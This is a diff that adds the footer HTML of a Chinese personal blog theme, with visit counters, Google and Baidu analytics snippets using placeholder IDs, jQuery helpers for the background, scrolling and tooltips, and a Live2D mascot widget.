+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" >极客到访数: 
+                            <span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>, </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit">本页阅读量: 
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+
+    </div>
+    
+<script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+
+<script src="/js/main.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var backgroundnum = 7;
+            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+        })
+    </script>
+
+
+<!-- Google Analytics -->
+<script type="text/javascript">
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'xxxxx', 'auto');
+ga('send', 'pageview');
+
+</script>
+<!-- End Google Analytics -->
+
+
+
+	<script>
+	var _hmt = _hmt || [];
+	(function() {
+	  var hm = document.createElement("script");
+	  hm.src = "//hm.baidu.com/hm.js?xxxxxx";
+	  var s = document.getElementsByTagName("script")[0]; 
+	  s.parentNode.insertBefore(hm, s);
+	})();
+	</script>
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    $(document).ready(function() {
+        if ($("#comments").length < 1) {
+            $("#scroll > a:nth-child(2)").hide();
+        };
+    })
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+  <script language="javascript">
+    $(function() {
+        $("a[title]").each(function() {
+            var a = $(this);
+            var title = a.attr('title');
+            if (title == undefined || title == "") return;
+            a.data('title', title).removeAttr('title').hover(
+            function() {
+                var offset = a.offset();
+                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
+                    top: offset.top - a.outerHeight() - 15,
+                    left: offset.left + a.outerWidth()/2 + 1
+                }).fadeIn(function() {
+                    var pop = $(this);
+                    setTimeout(function() {
+                        pop.remove();
+                    }, pop.text().length * 800);
+                });
+            }, function() {
+                $("#anchortitlecontainer").remove();
+            });
+        });
+    });
+</script>
+
+
+    <script type="text/javascript" src="/js/clicklove.js"></script>
+  </div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"right","width":250,"height":500},"mobile":{"show":true}});</script></body>
+
+</html>
